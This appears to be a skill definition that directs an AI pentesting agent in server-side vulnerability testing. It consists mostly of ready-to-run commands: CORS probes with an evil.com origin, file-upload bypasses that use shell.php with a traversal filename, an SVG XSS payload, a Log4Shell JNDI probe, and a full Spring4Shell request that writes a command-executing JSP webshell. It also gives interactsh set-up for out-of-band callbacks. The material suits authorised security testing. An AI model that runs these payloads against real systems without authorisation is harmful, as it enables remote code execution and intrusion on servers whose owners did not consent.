---
name: server-side
description: Server-side vulnerability testing — misconfigs, CORS, security headers, CVE probes, file upload
allowed-tools: [Bash, Read, Write]
---
> **OOB callbacks (Tzar-Bot):** No Burp Collaborator MCP is wired into this platform. For out-of-band confirmation, executor agents should use **interactsh** — run `interactsh-client -json -o $OUTPUT_DIR/recon/interactsh.log` in a side terminal; it prints a unique `*.oast.fun` host and live-logs DNS/HTTP/SMTP hits. Set `COLLAB=<that-host>` and reuse it anywhere the per-class references under `reference/` mention Burp Collaborator or `$COLLAB`. Burp Collaborator stays valid if the operator has Burp open.

# Server-Side Testing

Test server configuration, security headers, CVE-specific probes, and file handling.

## Tools

| Tool | Purpose |
|------|---------|
| nuclei | Template-based CVE and misconfiguration scanning |
| nikto | Web server vulnerability scanner |
| testssl.sh | SSL/TLS configuration analysis |
| sslscan | TLS cipher and protocol testing |
| curl | Manual header and request testing |

## Security Headers Audit

```bash
curl -sI TARGET | tee OUTPUT_DIR/recon/response-headers.txt

# Check for missing security headers (each missing = informational finding)
for header in "X-Frame-Options" "X-Content-Type-Options" "X-XSS-Protection" \
              "Strict-Transport-Security" "Content-Security-Policy" \
              "Referrer-Policy" "Permissions-Policy"; do
  if ! grep -qi "$header" OUTPUT_DIR/recon/response-headers.txt; then
    echo "MISSING: $header"
  fi
done
```

## CORS Misconfiguration

```bash
# Test reflected origin
curl -sI -H "Origin: https://evil.com" TARGET/api/user | grep -i "access-control"
curl -sI -H "Origin: null" TARGET/api/ | grep -i "access-control"
curl -sI -H "Origin: https://TARGET_HOSTevil.com" TARGET/api/ | grep -i "access-control"

# Dangerous: ACAO: * with credentials
curl -sI -H "Origin: https://evil.com" TARGET/api/ | grep -i "access-control-allow-credentials"
```

## Dangerous HTTP Methods

```bash
# Check for PUT, DELETE, TRACE
curl -sX OPTIONS TARGET -v 2>&1 | grep -i "allow:"
curl -sX TRACE TARGET -v | head -10
curl -sX PUT TARGET/test-delete-me.txt -d "test" -v 2>&1 | head -5
```

## SSL/TLS

```bash
testssl.sh --quiet --color 0 TARGET | tee OUTPUT_DIR/recon/testssl.txt
sslscan TARGET | tee OUTPUT_DIR/recon/sslscan.txt

# Quick checks
nmap --script ssl-enum-ciphers -p 443 TARGET_HOST -oN OUTPUT_DIR/recon/nmap-ssl.txt
```

## Nuclei Scanning

```bash
# CVE templates
nuclei -u TARGET -t ~/.local/nuclei-templates/cves/ -o OUTPUT_DIR/logs/nuclei-cves.txt \
  -rate-limit 10

# Misconfigurations
nuclei -u TARGET -t ~/.local/nuclei-templates/misconfiguration/ \
  -o OUTPUT_DIR/logs/nuclei-misconfig.txt -rate-limit 10

# Exposed panels
nuclei -u TARGET -t ~/.local/nuclei-templates/exposed-panels/ \
  -o OUTPUT_DIR/logs/nuclei-panels.txt

# All templates (slower)
nuclei -u TARGET -t ~/.local/nuclei-templates/ -o OUTPUT_DIR/logs/nuclei-full.txt \
  -rate-limit 5 -severity medium,high,critical
```

## File Upload Testing

```bash
# Test extension bypass
for ext in php phtml phar php5 php7 shtml asp aspx jsp; do
  curl -s -F "file=@/tmp/test.$ext;type=image/jpeg" TARGET/upload | grep -i "success\|uploaded"
done

# MIME type bypass
curl -s -F "file=@/tmp/shell.php;type=image/png" TARGET/upload

# Path traversal in filename
curl -s -F "file=@/tmp/shell.php;filename=../../shell.php" TARGET/upload

# SVG XSS upload
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>' > /tmp/xss.svg
curl -s -F "file=@/tmp/xss.svg;type=image/svg+xml" TARGET/upload
```

## Known CVE Probes (common)

```bash
# Log4Shell (CVE-2021-44228)
curl -s -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}' TARGET/ | head -5

# Spring4Shell (CVE-2022-22965)
curl -s -X POST TARGET/ -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(\%22j%22.equals(request.getParameter(\%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(\%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while(-1!%3D(a%3Din.read(b)))%7B%20out.println(new%20String(b))%3B%20%7D%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" 2>/dev/null | head -3
```

## Output

Findings → `OUTPUT_DIR/findings/finding-NNN/`
Raw scan results → `OUTPUT_DIR/logs/`

---

## Deep-dive references (authoritative)

The inline sections above are **quick-start orchestration**. For real testing of any area below, the `reference/` file is the **source of truth** (curated from disclosed reports — payloads, bypass tables, chain templates). Load it before deep testing; don't rely on the quick-start commands alone.

- `reference/hunt-cors.md` — Hunt CORS Misconfiguration…
- `reference/hunt-file-upload.md` — Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via filename.
- `reference/hunt-misc.md` — Deep MISC hunting — payloads, bypass tables, and disclosed-report chains.
